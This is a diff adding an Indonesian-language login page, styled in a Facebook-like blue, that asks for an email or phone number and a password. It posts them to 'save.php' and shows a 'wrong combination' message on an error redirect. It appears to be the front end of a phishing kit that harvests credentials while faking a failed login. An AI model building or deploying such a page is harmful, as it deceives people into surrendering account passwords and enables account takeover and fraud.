@@ -1,0 +1,33 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke Akun Anda</title>
+    <style>
+        body { font-family: Arial; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 320px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+        .alert { color: red; font-size: 14px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>Login ke Akun</h2>
+    <form action="save.php" method="POST">
+        <input type="text" name="email" placeholder="Email atau nomor telepon" required>
+        <input type="password" name="password" placeholder="Kata sandi" required>
+        <button type="submit">Masuk</button>
+    </form>
+    <div class="alert" id="msg">Kombinasi salah, coba lagi.</div>
+</div>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    if(urlParams.has('error')) {
+        document.getElementById('msg').style.display = 'block';
+    }
+</script>
+</body>
+</html>
